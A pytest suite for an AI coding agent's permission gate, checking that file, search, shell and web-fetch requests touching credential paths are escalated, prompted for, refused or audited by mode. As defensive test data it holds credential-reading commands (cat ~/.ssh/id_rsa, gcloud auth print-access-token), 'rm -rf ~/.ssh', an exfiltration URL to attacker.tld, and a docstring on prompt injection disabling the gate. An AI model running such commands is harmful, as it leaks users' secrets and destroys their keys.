"""The exfiltration floor on the opencode adapter's FILESYSTEM + NETWORK lanes.

``gate_shell_action`` has always escalated a shell command that names a secret
path (``cat ~/.alkera/auth.yml``) to EGRESS — see ``apps/cli/tests/plugins/test_bash_gate.py``.
The vendored ``read``/``grep``/``glob``/``lsp`` tools reach the SAME files through a
different lane, and used to be classified as a bare ``(fs, READ)`` with no look at
the target: the policy's READ fast path then auto-allowed them in EVERY mode, with
no prompt and no ``decisions.jsonl`` record. Same for ``webfetch``, whose URL is a
write channel out of the machine, and for the harness's OWN shell tool, whose ask
never went through ``gate_shell_action``.

Every tool names its target somewhere else on the wire, so the classification tests
below feed the ACTUAL ``permission.asked`` properties each vendored tool emits
(quoted from ``vendor/opencode/packages/opencode/src/tool/*.ts``) through the real
translator — passing a path as ``patterns[0]`` for all of them would be a false
green, since only ``read``/``edit`` ever put one there.

These pin the fixed contract on every lane, per mode, plus the asymmetric
negatives: an ordinary project file still auto-allows, and the chat's own
Alkera-managed scratch dir (which lives under ``.alkera/``) stays exempt so plan
mode keeps working.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
from alkera_cli.harness.adapters.opencode_translate import (
    OpencodeEventTranslator,
    _descriptor_for_opencode,
    _TranslatorContext,
)
from alkera_cli.plugins.plugin_base.permissions import CREDENTIAL_PATH_GATE_ENV
from alkera_cli.plugins.plugin_base.permissions.resolve import DecisionEngine
from alkera_core.schemas.chat import PermissionRequest

WORKSPACE = Path("/Users/someone/repo")


@pytest.fixture(autouse=True)
def _credential_path_gate_on(monkeypatch: pytest.MonkeyPatch) -> None:
    """The gate is OFF by default (``credential_path_gate_enabled``): the scan
    refused the plan file plan mode asks for, and it has not been tested against
    the paths a real session names. These cases run with it switched on so the
    mechanism stays pinned for the day it is turned back on deliberately; the
    default-off contract lives in ``test_credential_path_gate_switch.py``."""
    monkeypatch.setenv(CREDENTIAL_PATH_GATE_ENV, "1")


# The secret locations the marker list is meant to cover, as a tool would name them.
SECRET_PATHS = [
    pytest.param("/Users/someone/.alkera/auth.yml", id="alkera-bearer"),
    pytest.param("/Users/someone/.ssh/id_ed25519", id="ssh-key"),
    pytest.param("/Users/someone/.aws/credentials", id="aws-creds"),
    pytest.param("/Users/someone/.kube/config", id="kubeconfig"),
    pytest.param("/srv/app/.env.production", id="project-env"),
    pytest.param("/etc/ssl/private/server.pem", id="private-key-file"),
]

# The credential DIRECTORIES a search tool would be pointed at. (Not simply
# `Path(secret).parent`: `/srv/app/.env.production` lives in an ordinary project
# dir — the marker is on the FILE there, which is what `include` / `read` catch.)
SECRET_DIRS = [
    pytest.param("/Users/someone/.alkera", id="alkera-home"),
    pytest.param("/Users/someone/.ssh", id="ssh-dir"),
    pytest.param("/Users/someone/.aws", id="aws-dir"),
    pytest.param("/Users/someone/.gnupg", id="gnupg-dir"),
    pytest.param("/Users/someone/.config/gcloud", id="gcloud-dir"),
    pytest.param("/Users/someone/.kube", id="kube-dir"),
]

ORDINARY_PATHS = [
    pytest.param("src/main.py", id="relative-source"),
    pytest.param("/srv/app/README.md", id="absolute-doc"),
    pytest.param("/srv/app/keychain_service.py", id="key-substring-in-word"),
]


class _Broker:
    """Records prompts; answers each with a fixed option."""

    def __init__(self, option: str) -> None:
        self._option = option
        self.prompts = 0

    async def resolve(self, request: Any) -> str:
        self.prompts += 1
        return self._option


class _Sink:
    """Captures the audit records the engine writes."""

    def __init__(self) -> None:
        self.records: list[Any] = []

    def record(self, record: Any) -> None:
        self.records.append(record)


def _subject(
    permission: str,
    patterns: list[str],
    metadata: dict[str, Any] | None = None,
    *,
    workspace_root: Path | None = WORKSPACE,
    sandbox_dir: Path | None = None,
) -> dict[str, Any]:
    """Drive a real ``permission.asked`` through the translator and return the
    typed subject the runtime resolves — the contract under test is what comes out
    of THE TRANSLATOR, not what a hand-built descriptor says."""
    ctx = _TranslatorContext(
        session_id="sid", workspace_root=workspace_root, sandbox_dir=sandbox_dir
    )
    event = OpencodeEventTranslator(ctx).translate(
        {
            "type": "permission.asked",
            "properties": {
                "id": "perm_1",
                "permission": permission,
                "patterns": patterns,
                "metadata": metadata if metadata is not None else {},
            },
        }
    )
    assert isinstance(event, PermissionRequest)
    assert event.subject is not None
    return event.subject


# --------------------------------------------------------------------------- #
# Classification — the REAL wire shape of each vendored tool.
#
# read.ts:228     patterns=[relative(worktree, filepath)]  metadata={}
# edit.ts:99      patterns=[relative(worktree, filePath)]  metadata={filepath, diff}
# grep.ts:46      patterns=[params.pattern]                metadata={pattern, path, include}
# glob.ts:33      patterns=[params.pattern]                metadata={pattern, path}
# lsp.ts:56       patterns=["*"]                           metadata={operation, filePath, …}
# repo_overview   patterns=[repository ?? path]            metadata={repository, path, depth}
# external-dir:41 patterns=[dir + "/*"]                    metadata={filepath, parentDir}
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("target", SECRET_PATHS)
def test_read_of_a_secret_path_is_egress(target: str) -> None:
    """`read` is the only fs tool that really does put the path in patterns[0]
    (worktree-relative, so an out-of-tree read arrives as `../../.ssh/id_rsa`)."""
    assert _subject("read", [target])["effect"] == "egress"


@pytest.mark.parametrize("directory", SECRET_DIRS)
def test_grep_of_a_secret_directory_is_egress(directory: str) -> None:
    """grep puts the SEARCH PATTERN in patterns[0] and the directory in
    `metadata.path`. Reading only patterns[0] left a grep of ~/.aws an
    auto-allowed READ — and grep returns the matched LINES, so it is a full read
    primitive, not a name listing. (ripgrep.ts passes --hidden, so the dotfiles
    in those directories really are searched.)"""
    subject = _subject(
        "grep",
        ["aws_secret_access_key"],
        {"pattern": "aws_secret_access_key", "path": directory},
    )
    assert subject["effect"] == "egress", f"grep of {directory} must not auto-allow"


@pytest.mark.parametrize("directory", SECRET_DIRS)
def test_glob_of_a_secret_directory_is_egress(directory: str) -> None:
    """Same shape as grep: patterns[0] is the glob, `metadata.path` is the root."""
    subject = _subject("glob", ["**/*"], {"pattern": "**/*", "path": directory})
    assert subject["effect"] == "egress"


@pytest.mark.parametrize("target", SECRET_PATHS)
def test_lsp_on_a_secret_file_is_egress(target: str) -> None:
    """lsp sends the literal `patterns: ["*"]` and the file under
    `metadata.filePath` — capital P, a different key from every other tool."""
    subject = _subject("lsp", ["*"], {"operation": "definition", "filePath": target, "line": 1})
    assert subject["effect"] == "egress"


def test_grep_include_glob_naming_a_key_file_is_egress() -> None:
    """`include` is grep's filename filter: a project-scoped grep restricted to
    `*.pem` is a key hunt even though the directory is benign."""
    subject = _subject(
        "grep",
        ["BEGIN PRIVATE KEY"],
        {"pattern": "BEGIN PRIVATE KEY", "path": str(WORKSPACE), "include": "*.pem"},
    )
    assert subject["effect"] == "egress"


def test_external_directory_ask_names_the_file_in_metadata() -> None:
    """external-directory.ts sends the `<dir>/*` allow-glob in patterns and the
    real file in `metadata.filepath` / `parentDir`."""
    subject = _subject(
        "external_directory",
        ["/Users/someone/.ssh/*"],
        {"filepath": "/Users/someone/.ssh/id_rsa", "parentDir": "/Users/someone/.ssh"},
    )
    assert subject["effect"] == "egress"


@pytest.mark.parametrize("target", ORDINARY_PATHS)
def test_an_ordinary_read_stays_a_plain_read(target: str) -> None:
    """The asymmetric negative: escalating everything would make the agent
    unusable. Only paths the marker list names get raised."""
    assert _subject("read", [target])["effect"] == "read"


@pytest.mark.parametrize(
    "permission,patterns,metadata",
    [
        pytest.param("grep", ["TODO"], {"pattern": "TODO"}, id="grep-no-path"),
        pytest.param("glob", ["**/*.py"], {"pattern": "**/*.py"}, id="glob-no-path"),
        pytest.param("lsp", ["*"], {"operation": "workspaceSymbol"}, id="lsp-workspace-symbol"),
        pytest.param(
            "grep",
            ["TODO"],
            {"pattern": "TODO", "path": str(WORKSPACE / "src")},
            id="grep-project-subdir",
        ),
    ],
)
def test_a_directory_walk_over_the_workspace_stays_a_plain_read(
    permission: str, patterns: list[str], metadata: dict[str, Any]
) -> None:
    """The other asymmetric negative, and the reason absence is resolved rather
    than escalated: an omitted `path` means "the worktree" (grep.ts / glob.ts:
    `params.path ?? ins.directory`), which is the project the user pointed the
    agent at. Escalating those would make plan mode refuse every search."""
    assert _subject(permission, patterns, metadata)["effect"] == "read"


@pytest.mark.parametrize(
    "permission,patterns,metadata",
    [
        pytest.param("grep", ["TODO"], {"pattern": "TODO"}, id="grep"),
        pytest.param("glob", ["**/*"], {"pattern": "**/*"}, id="glob"),
        pytest.param("lsp", ["*"], {"operation": "workspaceSymbol"}, id="lsp"),
        pytest.param("repo_overview", [], {}, id="repo-overview"),
    ],
)
def test_a_directory_walk_with_no_resolvable_root_fails_closed(
    permission: str, patterns: list[str], metadata: dict[str, Any]
) -> None:
    """Fail CLOSED: a tool that walks a directory, named none, and whose worktree
    we don't know could be reading anything — it must not fall through to READ."""
    subject = _subject(permission, patterns, metadata, workspace_root=None)
    assert subject["effect"] == "egress"
    assert any("cannot rule out" in reason for reason in subject["reasons"])


def test_a_workspace_that_is_itself_a_secret_directory_is_escalated() -> None:
    """The fallback is a real check, not a rubber stamp: pointing the agent at
    ~/.ssh makes even a path-less grep an exfiltration risk."""
    subject = _subject(
        "grep", ["BEGIN"], {"pattern": "BEGIN"}, workspace_root=Path("/Users/someone/.ssh")
    )
    assert subject["effect"] == "egress"


def test_a_write_to_a_secret_path_is_escalated_too() -> None:
    """A write into ``.alkera/`` is how a prompt injection plants an agent
    definition / plugin tool that turns the gate off — it must hit the floor,
    not merely prompt as an ordinary edit (which an earlier 'always allow' on
    edits would have already waived)."""
    subject = _subject(
        "edit",
        ["../.alkera/permissions.yml"],
        {"filepath": "/srv/app/.alkera/permissions.yml", "diff": "@@"},
    )
    assert subject["effect"] == "egress"


def test_an_ordinary_edit_stays_a_write() -> None:
    subject = _subject("edit", ["src/main.py"], {"filepath": "/srv/app/src/main.py", "diff": "@@"})
    assert subject["effect"] == "write"


# --------------------------------------------------------------------------- #
# The harness's OWN shell tool — the same floor, one lane over.
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("cat ~/.ssh/id_rsa", id="ssh-key"),
        pytest.param("cat ~/.alkera/auth.yml", id="alkera-bearer"),
        pytest.param('grep -r "" "$HOME/.aws/credentials"', id="quoted-home-var"),
        pytest.param("gcloud auth print-access-token", id="marker-spans-a-space"),
    ],
)
def test_a_shell_read_of_a_secret_path_is_egress(command: str) -> None:
    """opencode's own shell tool asks us directly — its ask never passes through
    ``gate_shell_action`` (that gate wraps the parent-hosted ``alkera_bash``), so
    the floor has to be applied on this lane too. Reachable on Windows, where the
    native bash stays enabled; on POSIX the vendor tool is denied outright
    (``_OPENCODE_PERMISSION_ASK["bash"] = "deny"``), which is defense in depth,
    not a reason to leave the classification wrong."""
    assert _subject("bash", [command])["effect"] == "egress"


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("ls -la", id="plain-list"),
        pytest.param("cat src/main.py", id="source-read"),
        pytest.param("grep -rn TODO .", id="project-grep"),
    ],
)
def test_an_ordinary_shell_read_still_auto_allows(command: str) -> None:
    assert _subject("bash", [command])["effect"] == "read"


def test_a_shell_destroy_keeps_its_stronger_effect() -> None:
    """Tighten-only: the escalation must never pull a DESTROY down to EGRESS."""
    assert _subject("bash", ["rm -rf ~/.ssh"])["effect"] == "destroy"


# --------------------------------------------------------------------------- #
# The chat's own scratch dir — the carve-out plan mode depends on.
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "target",
    [
        pytest.param("plan.md", id="relative-to-worktree"),
        pytest.param("scratch/notes.txt", id="nested-relative"),
    ],
)
def test_the_chat_scratch_dir_is_exempt(tmp_path: Path, target: str) -> None:
    """``<chat>/sandbox/`` sits under ``.alkera/`` but holds only the model's own
    plan + scratch files, and plan mode depends on writing then re-reading them.
    It must NOT be escalated — including via the worktree-relative path opencode
    actually reports."""
    workspace = tmp_path / "repo"
    sandbox = workspace / ".alkera" / "chats" / "sid" / "sandbox"
    sandbox.mkdir(parents=True)
    relative = str((sandbox / target).relative_to(workspace))

    for kind, expected in (("read", "read"), ("edit", "write")):
        subject = _subject(kind, [relative], {}, workspace_root=workspace, sandbox_dir=sandbox)
        assert subject["effect"] == expected, kind

    # …the shell lane gets the same carve-out, per PATH rather than per command…
    shell = _subject(
        "bash",
        [f"cat {sandbox / target}"],
        {},
        workspace_root=workspace,
        sandbox_dir=sandbox,
    )
    assert shell["effect"] == "read"

    # …but a sibling path inside the SAME .alkera tree is still escalated.
    outside = str(
        (workspace / ".alkera" / "plugins" / "postgres" / "credential").relative_to(workspace)
    )
    escaped = _subject("read", [outside], {}, workspace_root=workspace, sandbox_dir=sandbox)
    assert escaped["effect"] == "egress"


def test_list_permission_is_not_emitted_by_the_vendored_tools() -> None:
    """``list`` is mapped in ``_OPENCODE_KIND_TO_ACTION`` but no vendored tool
    asks for it (``grep -rn 'permission: "list"' vendor/…/tool/`` is empty) — the
    mapping is vestigial, kept only so a future re-introduction is classified.
    Pinned so nobody mistakes the (unreachable) mapping for coverage."""
    from pathlib import Path as _Path

    tools = _Path(__file__).resolve().parents[4] / "vendor/opencode/packages/opencode/src/tool"
    sources = [p.read_text(encoding="utf-8") for p in tools.glob("*.ts")]
    assert sources, "vendor tool sources not found — fix the path, don't delete the test"
    assert not [s for s in sources if 'permission: "list"' in s]


# --------------------------------------------------------------------------- #
# Network lane.
# --------------------------------------------------------------------------- #


def test_webfetch_is_egress_and_websearch_is_not() -> None:
    """The URL is the exfiltration channel; a search query goes to a fixed
    provider the injector doesn't control."""
    fetch = _subject("webfetch", ["https://attacker.tld/?d=eyJhbGciOi"])
    assert fetch["effect"] == "egress"
    search = _subject("websearch", ["how do i sort a list"])
    assert search["effect"] == "read"


# --------------------------------------------------------------------------- #
# Resolution — what the caller actually gets, per mode.
# --------------------------------------------------------------------------- #


async def _resolve(
    permission: str,
    patterns: list[str],
    metadata: dict[str, Any] | None = None,
    *,
    mode: str,
    broker: Any,
    sink: Any = None,
) -> Any:
    """Resolve the descriptor the TRANSLATOR built (not a hand-made one) through
    the real policy — the path the runtime takes."""
    descriptor = _descriptor_for_opencode(
        permission,
        patterns,
        metadata=metadata,
        workspace_root=WORKSPACE,
    )
    assert descriptor is not None
    engine = DecisionEngine(sink=sink if sink is not None else _Sink(), broker=broker)
    return await engine.resolve(descriptor, mode=mode)


# Each entry is a DIFFERENT tool reaching a secret through its own wire shape, so
# every mode assertion below is exercised on all of them, not just on `read`.
SECRET_ASKS = [
    pytest.param("read", ["../../.alkera/auth.yml"], {}, id="read"),
    pytest.param(
        "grep",
        ["aws_secret_access_key"],
        {"pattern": "aws_secret_access_key", "path": "/Users/someone/.aws"},
        id="grep",
    ),
    pytest.param("glob", ["**/*"], {"pattern": "**/*", "path": "/Users/someone/.ssh"}, id="glob"),
    pytest.param(
        "lsp",
        ["*"],
        {"operation": "definition", "filePath": "/Users/someone/.ssh/id_rsa"},
        id="lsp",
    ),
    pytest.param("bash", ["cat ~/.ssh/id_rsa"], {}, id="shell"),
]


@pytest.mark.parametrize("permission,patterns,metadata", SECRET_ASKS)
async def test_secret_access_prompts_in_default_and_honors_approval(
    permission: str, patterns: list[str], metadata: dict[str, Any]
) -> None:
    broker = _Broker("allow_once")
    res = await _resolve(permission, patterns, metadata, mode="default", broker=broker)
    assert res.allowed is True
    assert broker.prompts == 1


@pytest.mark.parametrize("permission,patterns,metadata", SECRET_ASKS)
async def test_secret_access_denied_in_default_when_rejected(
    permission: str, patterns: list[str], metadata: dict[str, Any]
) -> None:
    broker = _Broker("reject_once")
    res = await _resolve(permission, patterns, metadata, mode="default", broker=broker)
    assert res.allowed is False
    assert broker.prompts == 1


@pytest.mark.parametrize("permission,patterns,metadata", SECRET_ASKS)
@pytest.mark.parametrize("mode", ["read_only", "plan"])
async def test_secret_access_is_refused_in_the_no_side_effect_modes(
    permission: str, patterns: list[str], metadata: dict[str, Any], mode: str
) -> None:
    """The modes the product presents as 'no side effects' used to allow this
    outright — with the broker never consulted."""
    broker = _Broker("allow_once")
    res = await _resolve(permission, patterns, metadata, mode=mode, broker=broker)
    assert res.allowed is False
    assert broker.prompts == 0


async def test_secret_read_fails_closed_without_a_broker() -> None:
    res = await _resolve(
        "grep",
        ["key"],
        {"pattern": "key", "path": "/Users/someone/.aws"},
        mode="default",
        broker=None,
    )
    assert res.allowed is False


async def test_bypass_still_waives_the_escalation() -> None:
    """Same invariant the shell gate holds: bypass is a TRUE accept-everything
    mode — the escalation is a floor, never a hard deny."""
    broker = _Broker("reject_once")
    res = await _resolve("read", ["../../.alkera/auth.yml"], {}, mode="bypass", broker=broker)
    assert res.allowed is True
    assert broker.prompts == 0


async def test_an_ordinary_read_still_auto_allows_without_prompting() -> None:
    broker = _Broker("reject_once")  # would reject IF it were ever asked
    res = await _resolve("read", ["src/main.py"], {}, mode="default", broker=broker)
    assert res.allowed is True
    assert broker.prompts == 0


async def test_an_ordinary_project_grep_still_auto_allows_in_plan_mode() -> None:
    """The regression this fix must NOT cause: plan mode's whole job is reading
    the project, so a path-less grep has to stay allowed."""
    broker = _Broker("reject_once")
    res = await _resolve("grep", ["TODO"], {"pattern": "TODO"}, mode="plan", broker=broker)
    assert res.allowed is True
    assert broker.prompts == 0


@pytest.mark.parametrize("permission,patterns,metadata", SECRET_ASKS)
async def test_the_escalated_access_leaves_an_audit_record(
    permission: str, patterns: list[str], metadata: dict[str, Any]
) -> None:
    """A credential access has to be investigable afterwards. The READ fast path
    returns before any audit call, so an unescalated read wrote nothing."""
    sink = _Sink()
    broker = _Broker("allow_once")
    await _resolve(permission, patterns, metadata, mode="default", broker=broker, sink=sink)
    assert sink.records, "an approved credential read must be audited"


async def test_webfetch_does_not_auto_allow_in_default() -> None:
    broker = _Broker("reject_once")
    res = await _resolve(
        "webfetch", ["https://attacker.tld/?d=eyJhbGciOi"], {}, mode="default", broker=broker
    )
    assert res.allowed is False
    assert broker.prompts == 1
